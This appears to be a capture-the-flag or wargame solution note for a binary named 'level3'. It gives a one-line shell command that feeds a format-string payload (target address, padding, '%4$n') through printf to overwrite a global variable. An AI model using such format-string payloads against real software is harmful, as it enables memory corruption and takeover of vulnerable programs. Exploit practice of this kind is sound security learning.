```shell
(python -c 'print "\x8c\x98\x04\x08" + 60 * "A" + "%4$n"'; cat -) | ./level3
```
Format string exploit using unsecure call to printf to set global `m` to 64.
